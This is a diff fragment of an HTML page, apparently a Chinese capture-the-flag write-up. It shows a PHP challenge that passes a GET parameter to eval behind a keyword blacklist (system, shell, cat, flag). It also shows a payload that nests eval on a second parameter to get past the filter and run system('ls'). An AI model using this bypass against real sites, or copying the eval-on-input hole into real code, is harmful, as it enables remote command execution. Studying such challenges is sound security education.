@@ -255,7 +255,7 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]))&#123;   <br> <span class="hljs-variable">$c</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>];   <br> <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="hljs-variable">$c</span>))&#123;     <br>     <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$c</span>);   <br> &#125;   <br>&#125;<span class="hljs-keyword">else</span>&#123;   <br> highlight_file(<span class="hljs-keyword">__FILE__</span>); <br>&#125;<br></code></pre></td></tr></table></figure>
 
 <blockquote>
-<p>?c=eval($_GET[‘a’]);&amp;a=system(‘ls’)</p>
+<p>?c=eval($_GET[‘a’]);&amp;a=system(‘ls’);</p>
 </blockquote>
 <p>这样就可以逃过对命令执行的单一变量过滤</p>
 <ul>
